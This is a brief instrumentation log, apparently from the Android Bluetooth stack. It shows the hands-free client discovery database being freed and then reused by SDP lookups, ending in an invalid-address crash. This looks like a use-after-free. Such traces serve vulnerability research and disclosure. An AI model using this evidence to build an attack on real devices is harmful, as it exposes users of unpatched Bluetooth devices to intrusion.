bta_hf_client_find_cb_by_handle result 0x74d95a4a30 p_disc_db 0xb4000076cb2f6190
bta_hf_client_free_db called
bta_hf_client_find_cb_by_handle called 0x1
bta_hf_client_find_cb_by_handle result 0x74d95a4a30 p_disc_db 0xb4000076cb2f6190
sdpu_find_ccb_by_cid called 0x49
sdpu_find_ccb_by_cid result 0x74d95d2f58 p_db 0xb4000076cb2f6190
sdpu_find_ccb_by_cid called 0x49
sdpu_find_ccb_by_cid result 0x74d95d2f58 p_db 0xb4000076cb2f6190
sdpu_find_ccb_by_cid called 0x49
sdpu_find_ccb_by_cid result 0x74d95d2f58 p_db 0xb4000076cb2f6190
sdpu_find_ccb_by_cid called 0x49
sdpu_find_ccb_by_cid result 0x74d95d2f58 p_db 0xb4000076cb2f6190
Process crashed: Bad access due to invalid address
```
